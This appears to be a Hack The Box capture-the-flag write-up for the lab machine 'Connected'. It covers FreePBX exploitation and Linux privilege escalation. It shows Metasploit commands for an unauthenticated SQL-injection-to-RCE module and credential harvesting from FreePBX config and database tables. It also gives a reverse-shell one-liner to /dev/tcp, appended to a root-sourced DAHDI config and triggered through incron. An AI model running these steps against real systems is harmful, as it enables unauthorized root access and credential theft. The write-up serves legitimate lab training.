# Connected - Hack The Box Writeup
![Status](https://img.shields.io/badge/Status-Complete-brightgreen)
![Hack The Box](https://img.shields.io/badge/Hack%20The%20Box-Connected-9FEF00?logo=hackthebox&logoColor=black)
![SQL Injection](https://img.shields.io/badge/SQL%20Injection-Initial%20Access-red)
![Privilege Escalation](https://img.shields.io/badge/Linux-Privilege%20Escalation-blue)

*A penetration testing walkthrough demonstrating FreePBX exploitation, remote code execution, and Linux privilege escalation.*

by: Brandon Chaney



## Enumeration

Initial enumeration revealed that the target was running FreePBX. Further service enumeration identified the web application and several associated services.

```bash
┌─[us-dedivip-3]─[10.10.14.27]─[bchaney@htb-ew3txawpuk]─[~]
└──╼ [★]$ nmap -sV connected.htb
...
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
```

The web server appeared to be running a vulnerable version of FreePBX, so I began researching known vulnerabilities affecting the installed components.




## Vulnerability Research

Research into the identified FreePBX version revealed two critical vulnerabilities worth investigating.

### 1. FreePBX UCP Socket.IO Authentication Bypass

The first vulnerability involved unauthenticated remote code execution through the FreePBX User Control Panel (UCP). The UCP Node server listens on ports 8001 and 8003 by default and uses an authentication guard for Socket.IO connections.

Due to changes in Socket.IO, this authentication mechanism could potentially be bypassed, allowing an unauthenticated client to send crafted events to the Asterisk Manager Interface (AMI) and execute commands as the `asterisk` user.

### 2. FreePBX MissedCall SQL Injection

The second vulnerability involved an unauthenticated SQL injection in the FreePBX `missedcall` module.




## Selecting an Attack Path

The first vulnerability required access to the UCP Node server on ports 8001 and 8003. However, enumeration showed that these ports were filtered on the target.

Because the required UCP services were not externally accessible, I ruled out the Socket.IO authentication bypass and AMI injection attack path.

```bash
┌─[us-dedivip-3]─[10.10.14.27]─[bchaney@htb-ew3txawpuk]─[~]
└──╼ [★]$ nmap -p 8001,8003 -sV connected.htb
...
PORT     STATE    SERVICE     VERSION
8001/tcp filtered vcom-tunnel
8003/tcp filtered mcreport

```

The second vulnerability was a better match for the target. Metasploit contains a module specifically targeting the unauthenticated FreePBX SQL injection:

```bash
┌─[us-dedivip-3]─[10.10.14.27]─[bchaney@htb-ew3txawpuk]─[~]
└──╼ [★]$ msfconsole -q -x "search freepbx"

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/linux/misc/asterisk_ami_originate_auth_rce   2024-08-08       great      Yes    Asterisk AMI Originate Authenticated RCE
   1  exploit/unix/http/freepbx_callmenum                  2012-03-20       manual     No     FreePBX 2.10.0 / 2.9.0 callmenum Remote Code Execution
   2  auxiliary/gather/freepbx_custom_extension_injection  2025-12-11       normal     Yes    FreePBX Custom Extension SQL Injection
   3  exploit/unix/http/freepbx_unauth_sqli_to_rce         2025-08-28       excellent  Yes    FreePBX ajax.php unauthenticated SQLi to RCE
   4  exploit/unix/webapp/freepbx_config_exec              2014-03-21       excellent  Yes    FreePBX config.php Remote Code Execution
   5  exploit/unix/http/freepbx_custom_extension_rce       2025-12-11       excellent  Yes    FreePBX endpoint SQLi to RCE
   6  exploit/unix/http/freepbx_firmware_file_upload       2025-12-11       excellent  Yes    FreePBX firmware file upload
```

`exploit/unix/http/freepbx_unauth_sqli_to_rce`

The module was rated as an excellent reliability option and provided a direct path from the SQL injection vulnerability to remote code execution.

Since a working exploit was already available, I proceeded with this attack path.




## Exploitation

I configured the Metasploit `freepbx_unauth_sqli_to_rce` module against the target and established a reverse TCP handler.

```bash
[msf](Jobs:0 Agents:0) exploit(unix/http/freepbx_unauth_sqli_to_rce) >> set rhosts connected.htb
rhosts => connected.htb
[msf](Jobs:0 Agents:0) exploit(unix/http/freepbx_unauth_sqli_to_rce) >> set lhost 10.10.14.27
lhost => 10.10.14.27
[msf](Jobs:0 Agents:0) exploit(unix/http/freepbx_unauth_sqli_to_rce) >> exploit
(Meterpreter 1)(/home/asterisk) > 
```

The exploit successfully leveraged the unauthenticated SQL injection to achieve remote code execution on the target.

A reverse shell was obtained as the `asterisk` user.

```bash
(Meterpreter 1)(/home/asterisk) > shell
Process 5675 created.
Channel 2 created.

python -c 'import pty; pty.spawn("/bin/bash")'

[asterisk@connected ~]$ 
```

> The module failed to properly sanitize the caller ID name before inserting it into the database, allowing an attacker to inject arbitrary SQL queries. This vulnerability could ultimately be leveraged to obtain administrative access and achieve remote code execution.



## Post-Exploitation Enumeration

With a shell as the `asterisk` user, I began enumerating the system for potential privilege escalation paths.

First, I checked the user's privileges, group memberships, SUID binaries, and scheduled tasks.

```bash
sudo -l
id
groups
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.d/
```

The asterisk user did not have any sudo privileges, and there were no immediately exploitable group memberships or SUID binaries. The system's root cron configuration also did not reveal an obvious privilege escalation path.

Since the initial checks did not provide a direct route to root, I shifted my focus toward FreePBX-specific attack surfaces.

## FreePBX Configuration

FreePBX commonly stores database credentials in configuration files such as /etc/freepbx.conf and /etc/amportal.conf. I inspected these files for credentials that could provide additional access.

The configuration contained database credentials belonging to the asterisk user.

```bash
[asterisk@connected ~]$ cat /etc/freepbx.conf
cat /etc/freepbx.conf
<?php
// This file was generated at 2025-11-30T14:08:27+00:00
	
$amp_conf["AMPDBUSER"] = "freepbxuser";
$amp_conf["AMPDBPASS"] = "mZzDpAGKTmPJ";
$amp_conf["AMPDBHOST"] = "localhost";
$amp_conf["AMPDBNAME"] = "asterisk";
$amp_conf["AMPDBENGINE"] = "mysql";
$amp_conf["datasource"] = "";

require_once "/var/www/html/admin/bootstrap.php";

```

I used these credentials to connect to the MariaDB database and began enumerating the available tables for potentially reusable credentials or other sensitive information.

```bash
[asterisk@connected ~]$ mysql -u freepbxuser -p
mysql -u freepbxuser -p
Enter password: mZzDpAGKTmPJ
...
MariaDB [(none)]> 
```

Once connected, I searched the database for tables containing usernames, passwords, and authentication information.

A FreePBX administrator password hash was discovered during this process.

```bash
MariaDB [asterisk]> SELECT * FROM ampusers;
SELECT * FROM ampusers;
+----------+-------+-----------+------------------------------------------+---------------+----------------+----------+----------+
| username | email | extension | password_sha1                            | extension_low | extension_high | deptname | sections |
+----------+-------+-----------+------------------------------------------+---------------+----------------+----------+----------+
| admin    |       |           | 05c689686a4fad5ce3ec76e7ae5708b1fe2da43a |               |                |          | *        |
+----------+-------+-----------+------------------------------------------+---------------+----------------+----------+----------+
1 row in set (0.00 sec)
```

I attempted to determine whether the hash could be cracked or reused, but no matching password was found.

Rather than spending additional time on the hash, I continued enumerating the database for other authentication material.

```bash
);SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME
    -> FROM information_schema.COLUMNS
    -> WHERE TABLE_SCHEMA IN ('asterisk','asteriskcdrdb')
    -> AND (
    ->     COLUMN_NAME LIKE '%pass%'
    ->     OR COLUMN_NAME LIKE '%user%'
    ->     OR COLUMN_NAME LIKE '%secret%'
    ->     OR COLUMN_NAME LIKE '%key%'
    ->     OR COLUMN_NAME LIKE '%token%'
```

## Asterisk Manager Interface Credentials

Further database enumeration revealed a manager table containing credentials stored in plaintext.

```bash
[asterisk@connected ~]$ ss -lntp | grep 5038
ss -lntp | grep 5038
LISTEN     0      10     127.0.0.1:5038                     *:*                   users:(("asterisk",pid=1323,fd=10))
```

One of the credentials belonged to the cdrpro_events account.

The Asterisk Manager Interface (AMI) was also listening on TCP port 5038, but only on localhost. This meant my attacking machine could not connect to AMI directly over the network.

However, because I already had a shell as asterisk, I could interact with the local AMI service from the compromised host.

I authenticated to AMI using the discovered cdrpro_events credentials.

[Insert screenshot]

## AMI Enumeration

After authenticating to AMI, I enumerated the available actions and investigated whether the Asterisk CLI could provide a path to operating system command execution.

The Asterisk CLI exposes a Command action that can execute Asterisk CLI commands. This initially appeared promising because certain Asterisk CLI functionality can interact with the underlying operating system.

```bash
Action: Command
Command: core show helpAction: Command
Command: core show help
Response: Success
Message: Command output follows
Output: !                              -- Execute a shell command
```

However, further testing showed that attempting to use !id was interpreted as a literal Asterisk command rather than being passed to the underlying system shell.

The AMI route therefore did not provide the shell escape I was looking for.

At this point, I stepped back from the AMI attack path and returned to local privilege escalation enumeration.

## Privilege Escalation

With the AMI route ruled out, I revisited the filesystem looking for files and processes that could be abused by the asterisk user.

The most common privilege escalation opportunities I considered were:

- [ ] **Sudo Misconfigurations** — `NOPASSWD` rules or overly permissive commands
- [ ] **SUID/SGID Binaries** — Executables running with elevated privileges
- [ ] **Writable Cron/Incron Jobs** — Privileged automation triggered by attacker-controlled files
- [ ] **PATH Hijacking** — Privileged scripts executing attacker-controlled binaries
- [ ] **Writable Configuration Files** — Configuration files sourced or executed by privileged processes

During this enumeration, I discovered that incrond was monitoring files that the asterisk user could write to.

```bash
cat /etc/incron.d/*
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
**/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart**
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager -- local $#
/var/spool/asterisk/incron IN_MODIFY, IN_ATTRIB, IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

## Incron Enumeration

I inspected the incron configuration and identified a rule monitoring:

/var/spool/asterisk/sysadmin/dahdi_restart

The rule used the IN_CLOSE_WRITE event and executed:

/usr/sbin/sysadmin_dahdi_restart

The important detail was that incrond was running as root.

This created the following execution chain:

asterisk writes to dahdi_restart
        ↓
incrond detects IN_CLOSE_WRITE
        ↓
/usr/sbin/sysadmin_dahdi_restart executes as root
        ↓
/etc/init.d/dahdi restart
        ↓
/etc/init.d/dahdi sources /etc/dahdi/init.conf
        ↓
Commands in init.conf execute as root

This was the privilege escalation path.

## Writable DAHDI Configuration

I next inspected the DAHDI-related files and permissions.

[Insert screenshot showing permissions]

The asterisk user had write access to:

/etc/dahdi/init.conf

The configuration file itself was not directly executed by asterisk. However, it was sourced by /etc/init.d/dahdi, which was ultimately executed as root through the incron chain.

Sourcing a configuration file executes its contents within the current shell context. Because /etc/init.d/dahdi was being executed with root privileges, commands contained in /etc/dahdi/init.conf would therefore execute as root.

This transformed the writable configuration file into a root-level code execution primitive.

## Exploitation

I first set up a Netcat listener on my attacking machine.

```bash
┌─[us-dedivip-3]─[10.10.14.27]─[bchaney@htb-muoevhb2ih]─[~]
└──╼ [★]$ nc -lvnp 4445
Listening on 0.0.0.0 4445
```

I then appended a reverse shell command to the writable DAHDI configuration file.

```bash
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4545 0>&1'" | tee -a init.conf
```

[Insert screenshot]

Finally, I triggered the incron rule by writing to the monitored file:

```bash
echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart
```

Writing and closing the file generated the required IN_CLOSE_WRITE event.

The execution chain was triggered:

IN_CLOSE_WRITE
    ↓
incrond
    ↓
sysadmin_dahdi_restart
    ↓
/etc/init.d/dahdi restart
    ↓
/etc/dahdi/init.conf
    ↓
reverse shell

The reverse shell connected back to my attacking machine with root privileges.

```bash
[root@connected root]# cat root.txt
```

I had successfully escalated from the asterisk user to root.

Root Flag

With root access obtained, I retrieved the root flag.
